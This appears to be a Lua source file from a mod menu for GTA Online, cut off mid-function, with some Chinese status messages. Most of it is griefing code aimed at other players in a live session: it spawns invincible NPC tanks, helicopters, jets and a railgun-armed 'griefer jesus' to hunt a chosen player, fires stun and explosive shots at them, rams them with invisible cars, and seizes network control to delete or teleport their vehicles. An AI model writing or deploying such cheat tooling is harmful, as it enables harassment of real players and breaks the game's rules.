function send_veh_attacker_weapon_mine(index, value)
    selectedMine = index
end
function send_veh_attacker_number(value)
    count = value
end
DecorFlag_isTrollyVehicle = 1 << 0
function dele_all_veh_attacker()
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        if is_decor_flag_set(vehicle, DecorFlag_isTrollyVehicle) then
            local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1, false)
            entities.delete_by_handle(driver)
            entities.delete_by_handle(vehicle)
        end
    end
end
DecorFlag_isEnemyVehicle = 1 << 1
local setGodmode = false
local gunnerWeapon = util.joaat("weapon_mg")
local weaponModId = -1
---@param targetId integer
local function spawn_minitank(targetId)
    local vehicleHash <const> = util.joaat("minitank")
    local pedHash <const> = util.joaat("s_m_y_blackops_01")
    request_model(vehicleHash); request_model(pedHash)
    local pos = players.get_position(targetId)
    local vehicle = entities.create_vehicle(vehicleHash, pos, 0.0)
    if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
        return
    end
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(vehicle), true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, false, true)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(vehicle), players.user(), true)
    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(vehicle, true, 1)
    set_decor_flag(vehicle, DecorFlag_isEnemyVehicle)
    local offset = get_random_offset_from_entity(vehicle, 35.0, 50.0)
    local outHeading = memory.alloc(4)
    local outCoords = v3.new()
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
        local driver = entities.create_ped(5, pedHash, offset, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(driver), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(driver, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(driver), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(driver, true, 1)
        ENTITY.SET_ENTITY_INVINCIBLE(driver, true)
        PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
        AUDIO.STOP_PED_SPEAKING(driver, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 46, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 1, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 3, false)
        PED.SET_PED_COMBAT_RANGE(driver, 2)
        PED.SET_PED_SEEING_RANGE(driver, 1000.0)
        PED.SET_PED_SHOOT_RATE(driver, 1000)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
        TASK.SET_DRIVE_TASK_DRIVING_STYLE(driver, 786468)
        ENTITY.SET_ENTITY_COORDS(vehicle, outCoords.x, outCoords.y, outCoords.z, false, false, false, false)
        ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, setGodmode)
        VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
        VEHICLE.SET_VEHICLE_MOD(vehicle, 10, weaponModId, false)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
        local blip = add_blip_for_entity(vehicle, 742, 4)
        util.create_tick_handler(function()
            local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
            local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if not ENTITY.DOES_ENTITY_EXIST(vehicle) or ENTITY.IS_ENTITY_DEAD(vehicle, false) or
            not ENTITY.DOES_ENTITY_EXIST(driver) or PED.IS_PED_INJURED(driver) then
                return false
            elseif not PED.IS_PED_IN_COMBAT(driver, target) and not PED.IS_PED_INJURED(target) then
                TASK.CLEAR_PED_TASKS(driver)
                TASK.TASK_COMBAT_PED(driver, target, 0, 16)
                PED.SET_PED_KEEP_TASK(driver, true)
            elseif not is_player_active(targetId, false, true) or
            players.get_position(targetId):distance(vehPos) > 1000.0 then
                TASK.CLEAR_PED_TASKS(driver)
                PED.SET_PED_COMBAT_ATTRIBUTES(driver, 46, false)
                TASK.TASK_VEHICLE_DRIVE_WANDER(driver, vehicle, 10.0, 786603)
                PED.SET_PED_KEEP_TASK(driver, true)
                remove_decor(vehicle)
                util.remove_blip(blip)
                local pVehicle = memory.alloc_int()
                memory.write_int(pVehicle, vehicle)
                ENTITY.SET_VEHICLE_AS_NO_LONGER_NEEDED(pVehicle)
                return false
            end
        end)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
end
---@param targetId integer
local function spawn_buzzard(targetId)
    local vehicleHash <const> = util.joaat("buzzard")
    local pedHash <const> = util.joaat("s_m_y_blackops_01")
    request_model(vehicleHash);	request_model(pedHash)
    local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
    local playerRelGroup = PED.GET_PED_RELATIONSHIP_GROUP_HASH(target)
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("ARMY"), playerRelGroup)
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, playerRelGroup, util.joaat("ARMY"))
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(0, util.joaat("ARMY"), util.joaat("ARMY"))
    local pos = players.get_position(targetId)
    local heli = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    if ENTITY.DOES_ENTITY_EXIST(heli) then
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(heli), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(heli, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(heli), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(heli, true, 1)
        set_decor_flag(heli, DecorFlag_isEnemyVehicle)
        local pos = get_random_offset_from_entity(target, 20.0, 40.0)
        pos.z = pos.z + 20.0
        ENTITY.SET_ENTITY_COORDS(heli, pos.x, pos.y, pos.z, false, false, false, false)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.VEH_TO_NET(heli), false)
        ENTITY.SET_ENTITY_INVINCIBLE(heli, setGodmode)
        VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
        local blip = add_blip_for_entity(heli, 422, 4)
        set_blip_name(blip, "buzzard2", true)
        local pilot = entities.create_ped(29, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        PED.SET_PED_INTO_VEHICLE(pilot, heli, -1)
        PED.SET_PED_MAX_HEALTH(pilot, 500)
        ENTITY.SET_ENTITY_HEALTH(pilot, 500, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(pilot, setGodmode)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilot, true)
        PED.SET_PED_KEEP_TASK(pilot, true)
        TASK.TASK_HELI_MISSION(pilot, heli, 0, target, 0.0, 0.0, 0.0, 23, 40.0, 40.0, -1.0, 0, 10, -1.0, 0)
        for seat = 1, 2 do
            local ped = entities.create_ped(29, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            PED.SET_PED_INTO_VEHICLE(ped, heli, seat)
            WEAPON.GIVE_WEAPON_TO_PED(ped, gunnerWeapon, -1, false, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 20, true)
            PED.SET_PED_MAX_HEALTH(ped, 500)
            ENTITY.SET_ENTITY_HEALTH(ped, 500, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(ped, setGodmode)
            PED.SET_PED_SHOOT_RATE(ped, 1000)
            PED.SET_PED_RELATIONSHIP_GROUP_HASH(ped, util.joaat("ARMY"))
            TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(ped, 200.0, 0)
        end
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
end
---@param targetId integer
local function spawn_lazer(targetId)
    local jetHash <const> = util.joaat("lazer")
    local pedHash <const> = util.joaat("s_m_y_blackops_01")
    request_model(jetHash); request_model(pedHash)
    local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
    local pos = players.get_position(targetId)
    local jet = entities.create_vehicle(jetHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    if ENTITY.DOES_ENTITY_EXIST(jet) then
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(jet), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(jet, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(jet), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(jet, true, 1)
        set_decor_flag(jet, DecorFlag_isEnemyVehicle)
        local pos = get_random_offset_from_entity(jet, 30.0, 80.0)
        pos.z = pos.z + 500.0
        ENTITY.SET_ENTITY_COORDS(jet, pos.x, pos.y, pos.z, false, false, false, false)
        set_entity_face_entity(jet, target, false)
        local blip = add_blip_for_entity(jet, 16, 4)
        set_blip_name(blip, "blip_4xz66m0", true) -- random collision for 0x2257C97F
        VEHICLE.CONTROL_LANDING_GEAR(jet, 3)
        ENTITY.SET_ENTITY_INVINCIBLE(jet, setGodmode)
        VEHICLE.SET_VEHICLE_FORCE_AFTERBURNER(jet, true)
        local pilot = entities.create_ped(5, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(pilot, false, true)
        PED.SET_PED_INTO_VEHICLE(pilot, jet, -1)
        TASK.TASK_PLANE_MISSION(pilot, jet, 0, target, 0.0, 0.0, 0.0, 6, 100.0, 0.0, 0.0, 80.0, 50.0, 0)
        PED.SET_PED_COMBAT_ATTRIBUTES(pilot, 1, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(jet, 60.0)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(jetHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
end
function veh_attacker_spawn(pid, index, option)
    local i = 0
    while i < count and players.exists(pid) do
        if option == "Minitank" then
            spawn_minitank(pid)
        elseif option == "Lazer" then
            spawn_lazer(pid)
        elseif option == "Buzzard" then spawn_buzzard(pid) end
        i = i + 1
        wait(150)
    end
end
local minitankModIds <const> =
{
    stockWeapon = -1,
    plasmaCannon = 1,
    rocket = 2,
}
function mintank_weapon(index)
    if index == 1 then
        weaponModId = minitankModIds.stockWeapon
    elseif index == 2 then
        weaponModId = minitankModIds.plasmaCannon
    elseif index == 3 then
        weaponModId = minitankModIds.rocket
    end
end
local gunnerWeapons <const> = {"weapon_mg", "weapon_rpg"}
function gunner_weapon(index)
    gunnerWeapon = util.joaat(gunnerWeapons[index])
end
function veh_attacker_spawn_count(value)
    count = value 
end
function veh_attacker_spawn_god(toggle)
    setGodmode = toggle
end
local deleteVehiclePassengers = function(vehicle)
    for seat = -1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) -1 do
        if VEHICLE.IS_VEHICLE_SEAT_FREE(vehicle, seat, false) then
            continue
        end
        local passenger = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, seat, false)
        if request_control(passenger, 1000) then entities.delete_by_handle(passenger) end
    end
end
function dele_veh_attacker()
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        if is_decor_flag_set(vehicle, DecorFlag_isEnemyVehicle) and request_control(vehicle, 1000) then
            deleteVehiclePassengers(vehicle)
            entities.delete_by_handle(vehicle)
        end
    end
end
local usingTazer = false
local lastShot = newTimer()
function taze_weapon(pid, on)
    usingTazer = on
    while usingTazer and is_player_active(pid, false, true) and
    not util.is_session_transition_active() do
        if not lastShot.isEnabled() or lastShot.elapsed() > 2500 then
            local pos = players.get_position(pid)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 2.0, pos.x, pos.y, pos.z, 1, true, util.joaat("weapon_stungun"), players.user_ped(), true, true, -1.0)
            lastShot.reset()
        end
        wait()
    end
end
function spec_player(pid, toggle)
    local reference = menu.ref_by_path("Players>" .. players.get_name_with_tags(pid) .. ">Spectate>Ninja Method", 33)
    menu.trigger_command(reference, toggle and "on" or "off")
end
function heavy_weapon(pid)
    local hash <const> = util.joaat("weapon_heavysniper")
    local camPos = CAM.GET_GAMEPLAY_CAM_COORD()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(camPos.x, camPos.y, camPos.z, pos.x, pos.y, pos.z, 200, false, hash, players.user_ped(), true, false, -1.0)
end
function firework_weapon(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    local hash <const> = util.joaat("weapon_firework")
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 3.0, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
end
function raypisol_weapon(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    local hash <const> = util.joaat("weapon_raypistol")
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 3.0, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
end
function fire_weapon(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    local hash <const> = util.joaat("weapon_molotov")
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
end
function emp_weapon(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    local hash <const> = util.joaat("weapon_emplauncher")
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
end
function SmashCar(Veh_h, tar1,  invis_aveh, rate)
    local  CC = VEHICLE.CREATE_VEHICLE(Veh_h, tar1.x, tar1.y, tar1.z + 5.0, 0, true, true, false)
    if invis_aveh then
     ENTITY.SET_ENTITY_VISIBLE(CC, false, 0)
 end
     ENTITY.SET_ENTITY_INVINCIBLE(CC, true)
     ENTITY.SET_ENTITY_VELOCITY(CC, 0, 0, -1000)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(CC, true)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(CC, true)
     wait(rate)
     ENTITY.SET_ENTITY_AS_MISSION_ENTITY(CC)
     entities.delete_by_handle(CC)
 end
 function RamCar(Veh_h, tar1x, tar1y, tar1z, invis_aveh, targets, rate)
     local RC = VEHICLE.CREATE_VEHICLE(Veh_h, tar1x, tar1y, tar1z, 0, true, true, false)
     if invis_aveh then
         ENTITY.SET_ENTITY_VISIBLE(RC, false, 0)
     end
     PFP(RC, targets)
     ENTITY.SET_ENTITY_INVINCIBLE(RC, true)
     VEHICLE.SET_VEHICLE_FORWARD_SPEED(RC, 1000)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(RC, true)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(RC, true)
     wait(rate)
     ENTITY.SET_ENTITY_AS_MISSION_ENTITY(RC)
     entities.delete_by_handle(RC)
 end
vehaset = {invis_aveh = false, vehasel = util.joaat('speedo2') , vehra = 1000}
function vehpushandhit(pid)
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local pname = PLAYER.GET_PLAYER_NAME(pid)
    local UV = ENTITY.GET_ENTITY_UPRIGHT_VALUE(targets)
    Delcar(targets)
    Streament(vehaset.vehasel)
    if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        SmashCar(vehaset.vehasel, tar1, vehaset.invis_aveh, vehaset.vehra)
        if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
            if set.alert then
                gtoast(pname..  '被粉碎了')
            end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x + 15, tar1.y, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    gtoast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x - 15, tar1.y, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    gtoast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x, tar1.y + 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    gtoast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x, tar1.y - 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    gtoast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x - 15, tar1.y - 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    gtoast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x + 15, tar1.y + 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    gtoast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x + 15, tar1.y - 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    gtoast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x - 15, tar1.y + 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    gtoast(pname.. ' 被碾过了')
                end
        else
            if set.alert then
                gtoast('无法攻击 ' ..pname)
            end
        end
        end
        end
        end
        end
        end
        end
        end
        end
    end
    if not players.exists(pid) then
        if set.alert then
            gtoast('你让他们怒不可遏')
        end
        util.stop_thread()
    end
end
function vehhitcantsee(on)
    vehaset.invis_aveh = on
end
function deleplayercar(pid)
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(player)
    if not PED.IS_PED_IN_ANY_VEHICLE(player, true) then
        gtoast("玩家不在载具里. :/")
        return
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_veh)
    wait(500)
    if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(player_veh) then
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(player_veh, false, false)
        entities.delete_by_handle(player_veh)
    else
        gtoast("无法控制此玩家载具. :/")
    end
end
function give_car_addon(pid, hash, center, ang)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    local pos = ENTITY.GET_ENTITY_COORDS(car, true)
    pos.x = pos['x']
    pos.y = pos['y']
    pos.z = pos['z']
    request_model_load(hash)
    local ramp = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos['x'], pos['y'], pos['z'], true, false, false)
    local size = get_model_size(ENTITY.GET_ENTITY_MODEL(car))
    if center then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, 0.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true)
    else
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, size['y']+1.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true)
    end
end
function first_to_upper(str)
    return (str:gsub("^%l", string.upper))
end
function get_model_size(hash)
    local minptr = memory.alloc(24)
    local maxptr = memory.alloc(24)
    MISC.GET_MODEL_DIMENSIONS(hash, minptr, maxptr)
    min = memory.read_vector3(minptr)
    max = memory.read_vector3(maxptr)
    local size = {}
    size['x'] = max['x'] - min['x']
    size['y'] = max['y'] - min['y']
    size['z'] = max['z'] - min['z']
    size['max'] = math.max(size['x'], size['y'], size['z'])
    memory.free(minptr)
    memory.free(maxptr)
    return size
end
function Changemod(pid, modtype, mod)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    if PED.IS_PED_IN_ANY_VEHICLE(pedm) ==true then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
        GetControl(vmod, spec, pid)
        VEHICLE.GET_NUM_MOD_KITS(vmod)
        VEHICLE.GET_VEHICLE_MOD_KIT(vmod)
        VEHICLE.SET_VEHICLE_MOD_KIT(vmod, 0)
        VEHICLE.SET_VEHICLE_MOD(vmod, modtype, mod, false)
    end
end
function changemodel(pid)
give_car_addon(pid, util.joaat("h4_prop_h4_loch_monster"), true, -90.0)
end
function tpcartomv1(pid, coord)
    local name = PLAYER.GET_PLAYER_NAME(pid)
    if robustmode then
        menu.trigger_commands("spectate" .. name .. " on")
        wait(1000)
    end
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        request_control_of_entity(car)
        if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(car) then
            for i=1, 3 do
                gtoast("OK")
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(car, coord['x'], coord['y'], coord['z'], false, false, false)
            end
        end
    end
end
function tpcartomv2(coord)
    for k,pid in pairs(players.list(false, true, true)) do
        tpcartomv1(pid, coord)
    end
end
function kick_from_veh(pid)
    log("Kicking " .. pid .. " from vehicle.")
    menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pid))
end
function npc_jack(target, nearest)
    npc_jackthr = util.create_thread(function(thr)
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
        local last_veh = PED.GET_VEHICLE_PED_IS_IN(player_ped, true)
        kick_from_veh(target)
        local st = os.time()
        while not VEHICLE.IS_VEHICLE_SEAT_FREE(last_veh, -1) do
            if os.time() - st >= 10 then
                gtoast("未能在10秒内释放汽车座椅")
                util.stop_thread()
            end
            wait()
        end
        local hash = 0x9C9EFFD8
        request_model_load(hash)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, -2.0, 0.0, 0.0)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']
        local ped = entities.create_ped(28, hash, coords, 30.0)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
        PED.SET_PED_INTO_VEHICLE(ped, last_veh, -1)
        VEHICLE.SET_VEHICLE_ENGINE_ON(last_veh, true, true, false)
        TASK.TASK_VEHICLE_DRIVE_TO_COORD(ped, last_veh, math.random(1000), math.random(1000), math.random(100), 100, 1, ENTITY.GET_ENTITY_MODEL(last_veh), 786996, 5, 0)
        gtoast("Vehicle jack complete!")
        util.stop_thread()
    end)
end
vehicle_uses = 0
ped_uses = 0
pickup_uses = 0
player_uses = 0
object_uses = 0
robustmode = false
function mod_uses(type, incr)
    if incr < 0 and is_loading then
        --util.log("不增加使用类型的 var " .. type .. " by " .. incr .. "- script is loading")
        return
    end
    --util.log("递增使用 var 类型 " .. type .. " by " .. incr)
    if type == "vehicle" then
        if vehicle_uses <= 0 and incr < 0 then
            return
        end
        vehicle_uses = vehicle_uses + incr
    elseif type == "pickup" then
        if pickup_uses <= 0 and incr < 0 then
            return
        end
        pickup_uses = pickup_uses + incr
    elseif type == "ped" then
        if ped_uses <= 0 and incr < 0 then
            return
        end
        ped_uses = ped_uses + incr
    elseif type == "player" then
        if player_uses <= 0 and incr < 0 then
            return
        end
        player_uses = player_uses + incr
    elseif type == "object" then
        if object_uses <= 0 and incr < 0 then
            return
        end
        object_uses = object_uses + incr
    end
end
local givegun = false
num_attackers = 1
function send_attacker(hash, pid, givegun)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    request_model_load(hash)
    for i=1, num_attackers do
        local attacker = entities.create_ped(28, hash, coords, math.random(0, 270))
        if godmodeatk then
            ENTITY.SET_ENTITY_INVINCIBLE(attacker, true)
        end
        TASK.TASK_COMBAT_PED(attacker, target_ped, 0, 16)
        PED.SET_PED_ACCURACY(attacker, 100.0)
        PED.SET_PED_COMBAT_ABILITY(attacker, 2)
        PED.SET_PED_AS_ENEMY(attacker, true)
        PED.SET_PED_FLEE_ATTRIBUTES(attacker, 0, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 46, true)
        if givegun then
            WEAPON.GIVE_WEAPON_TO_PED(attacker, atkgun, 0, false, true)
        end
    end
end
function dispatch_griefer_jesus(target)
    log("Dispatched griefer jesus.")
    griefer_jesus = util.create_thread(function(thr)
        gtoast("Griefer jesus sent!")
        request_model_load(-835930287)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
        coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']
        local jesus = entities.create_ped(1, -835930287, coords, 90.0)
        ENTITY.SET_ENTITY_INVINCIBLE(jesus, true)
        PED.SET_PED_HEARING_RANGE(jesus, 9999)
	    PED.SET_PED_CONFIG_FLAG(jesus, 281, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(jesus, 5, true)
	    PED.SET_PED_COMBAT_ATTRIBUTES(jesus, 46, true)
        PED.SET_PED_CAN_RAGDOLL(jesus, false)
        WEAPON.GIVE_WEAPON_TO_PED(jesus, util.joaat("WEAPON_RAILGUN"), 9999, true, true)
        TASK.TASK_GO_TO_ENTITY(jesus, target_ped, -1, -1, 100.0, 0.0, 0)
    	TASK.TASK_COMBAT_PED(jesus, target_ped, 0, 16)
        PED.SET_PED_ACCURACY(jesus, 100.0)
        PED.SET_PED_COMBAT_ABILITY(jesus, 2)
        while true do
            local player_coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
            local jesus_coords = ENTITY.GET_ENTITY_COORDS(jesus, false)
            local dist =  MISC.GET_DISTANCE_BETWEEN_COORDS(player_coords['x'], player_coords['y'], player_coords['z'], jesus_coords['x'], jesus_coords['y'], jesus_coords['z'], false)
            if dist > 100 then
                local behind = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, -3.0, 0.0, 0.0)
                ENTITY.SET_ENTITY_COORDS(jesus, behind['x'], behind['y'], behind['z'], false, false, false, false)
            end
            if not ENTITY.DOES_ENTITY_EXIST(jesus) then
                gtoast("Jesus apparently stopped existing. Stopping Jesus thread.")
                util.stop_thread()
            end
            local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
            if not players.exists(target) then
                gtoast("The player target has been lost. The griefer Jesus thread is stopping.")
                util.stop_thread()
            else
                TASK.TASK_COMBAT_PED(jesus, target_ped, 0, 16)
            end
            wait()
        end
    end)
end
function send_aircraft_attacker(vhash, phash, pid)
